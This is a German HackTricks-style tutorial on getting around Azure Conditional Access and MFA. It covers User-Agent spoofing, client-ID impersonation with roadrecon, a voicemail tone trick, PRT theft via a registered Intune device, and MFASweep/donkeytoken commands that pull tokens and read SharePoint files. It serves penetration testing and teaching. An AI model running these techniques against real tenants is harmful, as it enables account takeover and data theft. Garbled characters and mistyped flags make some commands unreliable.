# Az - Bedingte Zugriffsrichtlinien / MFA-Umgehung

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>

## Grundlegende Informationen

Azure Conditional Access-Richtlinien sind Regeln, die in Microsoft Azure eingerichtet werden, um den Zugriff auf Azure-Dienste und Anwendungen basierend auf bestimmten **Bedingungen** durchzusetzen. Diese Richtlinien helfen Organisationen, ihre Ressourcen zu sichern, indem sie unter den richtigen Umst√§nden die richtigen Zugriffskontrollen anwenden.\
Bedingte Zugriffsrichtlinien definieren im Wesentlichen **Wer** auf **Was** von **Wo** und **Wie** zugreifen kann.

Hier sind ein paar Beispiele:

1. **Anmelde-Risiko-Richtlinie**: Diese Richtlinie k√∂nnte so eingestellt werden, dass eine Multi-Faktor-Authentifizierung (MFA) erforderlich ist, wenn ein Anmelde-Risiko festgestellt wird. Wenn beispielsweise das Anmeldeverhalten eines Benutzers im Vergleich zu seinem regul√§ren Muster ungew√∂hnlich ist, z. B. wenn er sich aus einem anderen Land anmeldet, kann das System eine zus√§tzliche Authentifizierung anfordern.
2. **Ger√§tekonformit√§tsrichtlinie**: Diese Richtlinie kann den Zugriff auf Azure-Dienste nur auf Ger√§te beschr√§nken, die mit den Sicherheitsstandards der Organisation konform sind. Beispielsweise k√∂nnte der Zugriff nur von Ger√§ten erlaubt sein, die √ºber aktuelle Antivirensoftware verf√ºgen oder eine bestimmte Betriebssystemversion ausf√ºhren.

## Umgehungen von bedingten Zugriffsrichtlinien

Es ist m√∂glich, dass eine bedingte Zugriffsrichtlinie **einige Informationen √ºberpr√ºft, die leicht manipuliert werden k√∂nnen, um eine Umgehung der Richtlinie zu erm√∂glichen**. Und wenn beispielsweise die Richtlinie MFA konfiguriert hat, wird der Angreifer in der Lage sein, sie zu umgehen.

### Ger√§teplattformen - Ger√§tebedingung

Es ist m√∂glich, eine Bedingung basierend auf der **Ger√§teplattform** (Android, iOS, Windows, macOS) festzulegen, dies basiert jedoch auf dem **User-Agent**, sodass es ziemlich einfach ist, dies zu umgehen. Selbst wenn **alle Optionen die MFA erzwingen**, k√∂nnen Sie die MFA umgehen, wenn Sie einen **User-Agent verwenden, den er nicht erkennt**.

### Standorte: L√§nder, IP-Bereiche - Ger√§tebedingung

Nat√ºrlich k√∂nnte ein Angreifer, wenn dies in der bedingten Richtlinie festgelegt ist, einfach ein **VPN** im **zugelassenen Land** verwenden oder versuchen, einen Weg zu finden, um von einer **zugelassenen IP-Adresse aus zuzugreifen**, um diese Bedingungen zu umgehen.

### Office365-Client-Apps

Sie k√∂nnten angeben, dass Benutzer **Office 365-Apps aus dem Browser heraus MFA ben√∂tigen**:

<figure><img src="../../../.gitbook/assets/image (129).png" alt=""><figcaption></figcaption></figure>

Um dies zu umgehen, ist es m√∂glich vorzugeben, dass Sie sich in einer App von einer Desktop-Anwendung aus anmelden (wie zum Beispiel bei Microsoft Teams im folgenden Beispiel), was den Schutz umgehen wird:
```bash
roadrecon auth -u user@email.com -r https://outlook.office.com/ -c 1fec8e78-bce4-4aaf-ab1b-5451cc387264 --tokrns-stdout

<token>
```
Da die Microsoft Teams-App viele Berechtigungen hat, werden Sie in der Lage sein, diesen Zugriff zu nutzen.

{% hint style="success" %}
Sie k√∂nnen die **ID weiterer √∂ffentlicher Anwendungen** mit vordefinierten Office365-Berechtigungen in der Datenbank von roadtools finden:

{% code overflow="wrap" %}
```sql
SELECT appId, displayName FROM ApplicationRefs WHERE publicCLient = 1 ORDER BY displayName ASC
```
{% endcode %}
{% endhint %}

Dieser Angriff ist besonders interessant, da √∂ffentliche Office365-Anwendungen standardm√§√üig Berechtigungen zum Zugriff auf einige Daten haben.

### Andere Apps

Standardm√§√üig haben andere von Benutzern erstellte Apps keine Berechtigungen und k√∂nnten privat sein.\
Benutzer k√∂nnten jedoch auch **√∂ffentliche Apps** erstellen, denen sie einige **Berechtigungen** erteilen.

Ein potenzielles Szenario, in dem eine Richtlinie festgelegt ist, um **MFA zum Zugriff auf eine Anwendung zu erfordern**, wenn der Benutzer einen **Browser verwendet** (vielleicht, weil es sich um eine Webanwendung handelt und dies daher der einzige Weg ist), wenn es eine **Proxy-Anwendung** gibt - eine Anwendung, die es erlaubt, **mit anderen Apps im Namen von Benutzern zu interagieren** -, k√∂nnte der Benutzer sich in der Proxy-Anwendung **anmelden** und dann √ºber diese Proxy-Anwendung in die anf√§nglich MFA-gesch√ºtzte App **einloggen**.

√úberpr√ºfen Sie die Techniken [**Invoke-MFASweep**](az-conditional-access-policies-mfa-bypass.md#invoke-mfasweep) und [**donkeytoken**](az-conditional-access-policies-mfa-bypass.md#donkeytoken).

## Andere Az MFA Umgehungen

### Klingelton

Eine Option f√ºr Azure MFA besteht darin, **einen Anruf auf der konfigurierten Telefonnummer zu erhalten**, bei dem der Benutzer aufgefordert wird, das Zeichen `#` zu **senden**.

{% hint style="danger" %}
Da Zeichen nur **T√∂ne** sind, k√∂nnte ein Angreifer die **Voicemail**-Nachricht der Telefonnummer **kompromittieren**, als Nachricht den **Ton von `#`** konfigurieren und dann, wenn die MFA angefordert wird, sicherstellen, dass das **Telefon des Opfers besetzt ist** (es anrufen), damit der Azure-Anruf zur Voicemail umgeleitet wird.
{% endhint %}

### Konforme Ger√§te

Richtlinien verlangen oft ein konformes Ger√§t oder MFA, daher k√∂nnte ein **Angreifer ein konformes Ger√§t registrieren**, ein **PRT**-Token erhalten und auf diese Weise die MFA **umgehen**.

Beginnen Sie mit der Registrierung eines **konformen Ger√§ts in Intune**, dann **holen Sie sich das PRT** mit:
```powershell
$prtKeys = Get-AADIntuneUserPRTKeys - PfxFileName .\<uuid>.pfx -Credentials $credentials

$prtToken = New-AADIntUserPRTToken -Settings $prtKeys -GertNonce

Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken

<token returned>
```
## Werkzeuge

### [roadrecon](https://github.com/dirkjanm/ROADtools)

Erhalten Sie alle Richtlinien
```bash
roadrecon plugin policies
```
### [Invoke-MFASweep](https://github.com/dafthack/MFASweep)

MFASweep ist ein PowerShell-Skript, das versucht, **sich bei verschiedenen Microsoft-Diensten mit einem bereitgestellten Satz von Anmeldeinformationen anzumelden und zu √ºberpr√ºfen, ob MFA aktiviert ist**. Je nach Konfiguration der bedingten Zugriffsrichtlinien und anderer Einstellungen f√ºr die Multi-Faktor-Authentifizierung k√∂nnen einige Protokolle m√∂glicherweise nur mit einem Faktor verbleiben. Es enth√§lt auch eine zus√§tzliche √úberpr√ºfung f√ºr ADFS-Konfigurationen und kann versuchen, sich beim lokalen ADFS-Server anzumelden, wenn dieser erkannt wird.
```bash
Invoke-MFASweep -Username <username> -Password <pass>
```
### [donkeytoken](https://github.com/silverhack/donkeytoken)

Donkey token ist eine Reihe von Funktionen, die Sicherheitsberatern helfen sollen, die Conditional Access Policies validieren m√ºssen, Tests f√ºr 2FA-f√§hige Microsoft-Portale usw. durchzuf√ºhren.
```powershell
Import-Module 'C:\Users\Administrador\Desktop\Azure\Modulos ps1\donkeytoken' -Force
```
**Testen Sie jeden Portal**, ob es m√∂glich ist, **sich ohne MFA anzumelden**:
```powershell
Test-MFA -credential $cred -Verbose -Debug -InformationAction Continue
```
Da das **Azure-Portal** **nicht eingeschr√§nkt** ist, ist es m√∂glich, **einen Token vom Portal-Endpunkt zu sammeln, um auf jeden erkannten Dienst zuzugreifen**, der zuvor ausgef√ºhrt wurde. In diesem Fall wurde Sharepoint identifiziert, und es wird ein Token zum Zugriff darauf angefordert:

{% code overflow="wrap" %}
```powershell
$token = Get-DelegationTokenFromAzurePortal -credential $cred -token_type microsoft.graph -extension_type Microsoft_Intune
Read-JWTtoken -token $token.access_token
```
{% endcode %}

Angenommen, das Token hat die Berechtigung Sites.Read.All (von Sharepoint), selbst wenn Sie aufgrund von MFA nicht auf Sharepoint im Web zugreifen k√∂nnen, ist es m√∂glich, das Token zu verwenden, um auf die Dateien mit dem generierten Token zuzugreifen:
```powershell
$data = Get-SharePointFilesFromGraph -authentication $token $data[0].downloadUrl
```
## Referenzen

* [https://www.youtube.com/watch?v=yOJ6yB9anZM\&t=296s](https://www.youtube.com/watch?v=yOJ6yB9anZM\&t=296s)
* [https://www.youtube.com/watch?v=xei8lAPitX8](https://www.youtube.com/watch?v=xei8lAPitX8)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositorys einreichen.

</details>
